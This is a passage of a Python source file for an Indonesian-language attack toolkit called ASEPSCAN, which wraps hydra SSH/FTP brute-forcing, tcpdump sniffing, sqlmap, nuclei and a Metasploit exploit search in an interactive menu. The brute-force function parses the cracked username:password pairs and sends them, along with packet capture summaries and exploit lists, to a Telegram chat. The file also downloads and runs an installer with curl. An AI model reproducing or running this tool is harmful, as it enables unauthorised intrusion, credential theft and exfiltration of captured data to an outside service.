                        if len(parts) >= 6:
                            username = parts[4]
                            password = parts[6]
                            found_creds.append((username, password))

            if found_creds:
                cred_table = Table(title="Credentials Found", style="red")
                cred_table.add_column("Username")
                cred_table.add_column("Password")
                for user, pwd in found_creds:
                    cred_table.add_row(user, f"[bold red]{pwd}[/bold red]")

                console.print(cred_table)
                telegram_msg = f"<b>🔓 KREDENSIAL DITEMUKAN DI {target}/{service}</b>\n"
                for user, pwd in found_creds:
                    telegram_msg += f"• {user}:{pwd}\n"
            else:
                console.print("[yellow]✗ Tidak ditemukan kredensial valid[/yellow]")
                telegram_msg = f"<b>🔐 Bruteforce {service} gagal di {target}</b>"

            send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def packet_sniff(interface="any", count=100, mode="cepat"):
    if os.geteuid() != 0:
        console.print("[yellow]Lewatin packet sniff (butuh akses root)[/yellow]")
        return
    if not ensure_tool("tcpdump", get_system_install_command("tcpdump")):
        return

    if not os.geteuid() == 0:
        console.print("[red]⚠️ Diperlukan akses root! Jalankan dengan sudo[/red]")
        return

    filename = f"capture_{int(time.time())}.pcap"
    if mode == "lengkap":
        command = ["tcpdump", "-i", interface, "-c", str(count), "-w", filename]
    else:
        command = ["tcpdump", "-i", interface, "-c", str(count)]

    try:
        result = subprocess.run(command, capture_output=True, text=True, timeout=300)
        output = result.stdout if result.returncode == 0 else result.stderr

        if mode == "lengkap":
            summary = subprocess.run(["tcpdump", "-r", filename, "-n"], capture_output=True, text=True)
            output = summary.stdout[:1000] + "..." if summary.stdout else "Gagal baca file capture"

        console.print(Panel.fit(output, title="Packet Capture Summary", style="red"))
        console.print(f"[bold]File disimpan: [red]{filename}[/red][/bold]")

        telegram_msg = f"<b>📡 {count} PAKET DITANGKAP DARI {interface}</b>\n"
        telegram_msg += f"Hasil ringkasan:\n<pre>{clean_ansi_codes(output)}</pre>"
        if mode == "lengkap":
            telegram_msg += f"\nFile capture: {filename}"
        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def metasploit_search(service, mode="cepat"):
    if not ensure_tool("msfconsole", "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod +x msfinstall && ./msfinstall"):
        return

    limit = 100 if mode == "lengkap" else 20

    try:
        command = f"search {service} exit"
        result = subprocess.run(
            ["msfconsole", "-q", "-x", command],
            capture_output=True,
            text=True,
            timeout=300
        )
        output = result.stdout

        exploits = []
        lines = output.splitlines()
        for line in lines:
            if "exploit/" in line:
                parts = line.split()
                if len(parts) >= 3:
                    exploits.append(parts[2])

        exploits = exploits[:limit]

        if exploits:
            exp_table = Table(title="Available Exploits", style="red")
            exp_table.add_column("Nama Eksploit")
            for exp in exploits:
                exp_table.add_row(f"[red]{exp}[/red]")

            console.print(exp_table)
            telegram_msg = f"<b>💣 EKSPLOIT TERSEDIA UNTUK {service}</b>\n\n" + "\n".join(exploits)
        else:
            console.print(f"[yellow]✗ Tidak ditemukan eksploit untuk {service}[/yellow]")
            telegram_msg = f"<b>🛡️ Tidak ada eksploit untuk {service}</b>"

        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def menu():
    banner()

    while True:
        table = Table(title="ADVANCED PENTESTING TOOLKIT", header_style="bold red", show_lines=True)
        table.add_column("No", justify="center", style="cyan")
        table.add_column("Fitur", style="yellow")
        table.add_column("Deskripsi", style="green")
        table.add_row("1", "WHOIS Lookup", "Cek informasi domain")
        table.add_row("2", "WhatWeb", "Deteksi teknologi website")
        table.add_row("3", "Nmap", "Scan port & service")
        table.add_row("4", "Subdomain", "Cari subdomain tersembunyi")
        table.add_row("5", "Gobuster", "Bruteforce direktori/file")
        table.add_row("6", "Cek Header", "Analisis header HTTP")
        table.add_row("7", "Deteksi WAF", "Identifikasi Web Application Firewall")
        table.add_row("8", "Screenshot", "Ambil tangkapan layar website")
        table.add_row("9", "UserRecon", "Cek username di sosmed & platform")
        table.add_row("10", "DNS Recon", "Pengumpulan informasi DNS")
        table.add_row("11", "Email Harvester", "Cari email terkait domain")
        table.add_row("12", "Cloud Detector", "Deteksi layanan cloud")
        table.add_row("13", "CMS Detector", "Identifikasi Content Management System")
        table.add_row("14", "Port Scanner", "Scan port umum")
        table.add_row("15", "Nuclei Scan", "Scan kerentanan otomatis")
        table.add_row("16", "SQL Injection", "Deteksi SQLi dengan sqlmap")
        table.add_row("17", "Password Cracker", "Bruteforce login (SSH/FTP)")
        table.add_row("18", "Packet Sniffer", "Tangkap paket jaringan (root)")
        table.add_row("19", "Exploit Search", "Cari eksploit Metasploit")
        table.add_row("0", "Keluar", "Exit program")
        console.print(table)

        choice = console.input("[bold cyan]Pilih nomor menu: [/]").strip()

        mode = "cepat"
        if choice in ["3", "5", "15", "16", "17", "18"]:
            mode_choice = console.input("[bold green]Pilih mode (cepat/lengkap): [/]").strip().lower()
            if mode_choice in ["cepat", "lengkap"]:
                mode = mode_choice

        if choice == "1":
            target = console.input("[bold green]Masukkan domain: [/]").strip()
            whois_lookup(target, mode)
        elif choice == "2":
            target = console.input("[bold green]Masukkan URL target: [/]").strip()
            whatweb_scan(target, mode)
        elif choice == "3":
            target = console.input("[bold green]Masukkan IP/domain target: [/]").strip()
            nmap_scan(target, mode)
        elif choice == "4":
            target = console.input("[bold green]Masukkan domain utama: [/]").strip()
            subdomain_checker(target, mode)
        elif choice == "5":
            target = console.input("[bold green]Masukkan URL target: [/]").strip()
            gobuster_scan(target, mode)
        elif choice == "6":
            target = console.input("[bold green]Masukkan URL target: [/]").strip()
            cek_header(target, mode)
        elif choice == "7":
            target = console.input("[bold green]Masukkan URL target: [/]").strip()
            waf_detection(target, mode)
        elif choice == "8":
            target = console.input("[bold green]Masukkan URL target: [/]").strip()
            screenshot_web(target, mode)
        elif choice == "9":
            username = console.input("[bold green]Masukkan username: [/]").strip()
            userrecon_scan(username, mode)
        elif choice == "10":
            target = console.input("[bold green]Masukkan domain: [/]").strip()
            dns_recon(target, mode)
        elif choice == "11":
            target = console.input("[bold green]Masukkan domain: [/]").strip()
            email_harvester(target, mode)
        elif choice == "12":
            target = console.input("[bold green]Masukkan domain: [/]").strip()
            cloud_detector(target, mode)
        elif choice == "13":
            target = console.input("[bold green]Masukkan URL website: [/]").strip()
            cms_detector(target, mode)
        elif choice == "14":
            target = console.input("[bold green]Masukkan IP/domain: [/]").strip()
            port_scanner(target, mode)
        elif choice == "15":
            target = console.input("[bold red]Masukkan URL target: [/]").strip()
            nuclei_scan(target, mode)
        elif choice == "16":
            target = console.input("[bold red]Masukkan URL target: [/]").strip()
            sqlmap_scan(target, mode)
        elif choice == "17":
            target = console.input("[bold red]Masukkan IP target: [/]").strip()
            service = console.input("[bold red]Layanan (ssh/ftp/http): [/]").strip()
            hydra_attack(target, service, mode)
        elif choice == "18":
            iface = console.input("[bold red]Interface (default: any): [/]").strip() or "any"
            count = console.input("[bold red]Jumlah paket (default: 100): [/]").strip() or "100"
            packet_sniff(iface, int(count), mode)
        elif choice == "19":
            service = console.input("[bold red]Cari eksploit untuk (e.g., apache): [/]").strip()
            metasploit_search(service, mode)
        elif choice == "0":
            console.print(Panel.fit("[bold red]Keluar dari program...", title="Sampai Jumpa", style="red"))
            send_to_telegram("🔴 <b>ASEPSCAN DIHENTIKAN</b>\nProgram telah keluar")
            break
        else:
            console.print(Panel.fit("[bold red]Pilihan gak valid! Coba lagi.", style="red"))

        console.input("\n[bold yellow]Tekan Enter untuk lanjut...[/]")

if __name__ == "__main__":
    try:
        # Cek dependencies Python
        required_modules = [
            ("rich", "rich"),
            ("requests", "requests"),
            ("dns.resolver", "dnspython"),
            ("bs4", "beautifulsoup4"),
            ("urllib3", "urllib3")
        ]
        for import_name, pypi_name in required_modules:
            if os.system(f"python3 -c 'import {import_name}' > /dev/null 2>&1") != 0:
                print(f"[⏳] Menginstall dependency Python: {pypi_name}...")
                res = os.system(f"pip install -q {pypi_name}")
                if res != 0:
                    os.system(f"pip install -q --break-system-packages {pypi_name}")

        # Setup environment
        os.makedirs(os.path.expanduser("~/.wordlists"), exist_ok=True)
        os.makedirs(os.path.expanduser("~/.nuclei-templates"), exist_ok=True)

        # Kirim notifikasi mulai
        send_to_telegram("🟢 <b>ASEPSCAN ULTIMATE DIMULAI</b>\nTools pentesting siap digunakan!")

        menu()
    except KeyboardInterrupt:
        console.print("\n[bold red]Program dihentikan paksa![/bold red]")
        send_to_telegram("⛔ <b>ASEPSCAN DIHENTIKAN PAKSA!</b>\nProgram dihentikan dengan Ctrl+C")
    except Exception as e:
        console.print(f"[bold red]Error: {str(e)}[/bold red]")
        send_to_telegram(f"🚨 <b>ERROR ASEPSCAN</b>\n{str(e)}")
        sys.exit(1)
